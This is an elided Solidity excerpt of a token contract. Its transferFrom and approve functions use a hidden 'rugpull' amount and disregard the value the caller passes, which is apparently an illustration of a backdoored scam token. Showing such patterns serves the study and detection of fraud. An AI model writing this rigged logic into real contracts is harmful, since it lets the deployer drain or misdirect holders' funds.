...
contract Demo {
    ...
    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        ...
        balanceOf[from] = safeSub(balanceOf[from], rugpull);
        balanceOf[to] = safeAdd(balanceOf[to], rugpull);
        allowance[from][msg.sender] = safeSub(allowance[from][msg.sender], rugpull);
    ...
    function approve(address spender, uint256 value) external returns (bool) {
        ...
        allowance[msg.sender][spender] = rugpull;
        emit Approval(msg.sender, spender, rugpull);
        return true;
    }
